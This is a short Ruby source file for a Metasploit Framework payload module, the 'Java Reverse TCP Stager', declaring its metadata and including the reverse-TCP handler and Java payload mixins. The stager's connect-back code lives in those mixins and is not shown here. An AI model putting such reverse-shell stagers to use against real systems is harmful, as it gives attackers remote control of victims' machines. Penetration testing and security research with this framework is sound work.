##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/java/reverse_tcp'

module MetasploitModule

  CachedSize = 5303

  include Msf::Payload::Stager
  include Msf::Payload::Java
  include Msf::Payload::Java::ReverseTcp

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'Java Reverse TCP Stager',
      'Description' => 'Connect back stager',
      'Author'      => ['mihi', 'egypt'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'java',
      'Arch'        => ARCH_JAVA,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => 'javasocket',
      'Stager'      => {'Payload' => ''}
    ))
  end
end
